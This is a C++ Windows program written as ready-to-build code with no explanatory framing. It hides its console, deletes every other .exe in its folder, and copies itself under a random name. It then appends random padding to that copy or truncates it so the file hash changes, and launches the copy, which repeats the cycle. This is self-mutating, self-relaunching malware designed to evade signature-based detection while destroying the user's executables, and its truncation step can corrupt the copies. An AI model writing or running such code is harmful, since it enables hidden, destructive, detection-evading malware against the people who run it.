#include <iostream>
#include <fstream>
#include <string>
#include <random>
#include <windows.h>
#include <chrono>
#include <vector>

// Function to generate a random string of a given length
std::string generateRandomString(size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);

    std::string result;
    for (size_t i = 0; i < length; ++i) {
        result += charset[dis(gen)];
    }
    return result;
}

// Function to get the current time-based unique suffix
std::string getTimeBasedSuffix() {
    auto now = std::chrono::high_resolution_clock::now();
    auto time_since_epoch = now.time_since_epoch();
    long long milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch).count();
    return std::to_string(milliseconds);
}

// Function to get the current executable's path
std::string getCurrentExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

// Function to copy the executable to a new random filename
bool copyExecutableToRandomName(const std::string& originalPath, const std::string& newPath) {
    if (CopyFileA(originalPath.c_str(), newPath.c_str(), FALSE)) {
        std::cout << "Executable copied to: " << newPath << std::endl;
        return true;
    } else {
        std::cerr << "Error copying executable: " << GetLastError() << std::endl;
        return false;
    }
}

// Function to generate random padding data based on the current time as the seed
void generateRandomPadding(std::vector<char>& paddingBuffer, size_t paddingSize) {
    std::string timeSuffix = getTimeBasedSuffix();
    unsigned long long seed = std::stoull(timeSuffix);

    std::mt19937 gen(seed);
    std::uniform_int_distribution<> dis(0, 255);

    for (size_t i = 0; i < paddingSize; ++i) {
        paddingBuffer.push_back(static_cast<char>(dis(gen)));
    }
}

// Function to modify padding bytes in the executable with random data
void modifyPaddingInExecutable(const std::string& path, size_t& paddingSize) {
    std::ifstream inFile(path, std::ios::binary);
    if (!inFile) {
        std::cerr << "Failed to open executable for reading." << std::endl;
        return;
    }

    std::vector<char> exeContent((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::string timeSuffix = getTimeBasedSuffix();
    unsigned long long seed = std::stoull(timeSuffix);
    std::mt19937 gen(seed);
    std::uniform_int_distribution<> dis(0, 1);

    bool addPadding = dis(gen);

    std::uniform_int_distribution<size_t> randomPaddingSize(1, 100000);
    paddingSize = randomPaddingSize(gen);

    if (addPadding) {
        std::vector<char> randomPadding;
        generateRandomPadding(randomPadding, paddingSize);
        exeContent.insert(exeContent.end(), randomPadding.begin(), randomPadding.end());
        std::cout << "Random padding added to executable. Padding size: " << paddingSize << " bytes." << std::endl;
    } else {
        if (exeContent.size() <= paddingSize) {
            std::cerr << "Padding size is larger than the executable content, cannot remove padding!" << std::endl;
            return;
        }
        exeContent.resize(exeContent.size() - paddingSize);
        std::cout << "Padding removed from executable. Padding size: " << paddingSize << " bytes." << std::endl;
    }

    std::ofstream outFile(path, std::ios::binary);
    if (!outFile) {
        std::cerr << "Failed to open executable for writing." << std::endl;
        return;
    }
    outFile.write(exeContent.data(), exeContent.size());
    outFile.close();
}

// Function to execute the copied EXE
void executeCopiedExecutable(const std::string& newPath) {
    std::cout << "Executing copied EXE..." << std::endl;
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(newPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to execute the file: " << newPath << std::endl;
    } else {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Function to delete all .exe files in the current directory except the current executable
void deleteAllOtherExes() {
    std::string currentPath = getCurrentExecutablePath();
    std::string directory = currentPath.substr(0, currentPath.find_last_of("\\/") + 1);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "*.exe").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "Error finding .exe files in directory." << std::endl;
        return;
    }

    do {
        std::string filePath = directory + findFileData.cFileName;

        // Skip the current executable
        if (filePath != currentPath) {
            if (DeleteFileA(filePath.c_str())) {
                std::cout << "Deleted: " << filePath << std::endl;
            } else {
                std::cerr << "Failed to delete: " << filePath << std::endl;
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// Function to hide the console window
void hideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);  // SW_HIDE hides the window
}

int main() {
    // Hide the console window
    hideConsoleWindow();

    std::cout << "Program Started" << std::endl;

    std::string originalPath = getCurrentExecutablePath();
    std::string randomName = getTimeBasedSuffix() + ".exe";
    std::string newPath = originalPath.substr(0, originalPath.find_last_of("\\/") + 1) + randomName;

    size_t paddingSize = 0;

    // Delete all .exe files except the current executable
    deleteAllOtherExes();

    if (copyExecutableToRandomName(originalPath, newPath)) {
        modifyPaddingInExecutable(newPath, paddingSize);
        executeCopiedExecutable(newPath);
    }

    std::cout << "Program execution complete, exiting now..." << std::endl;

    return 0;
}
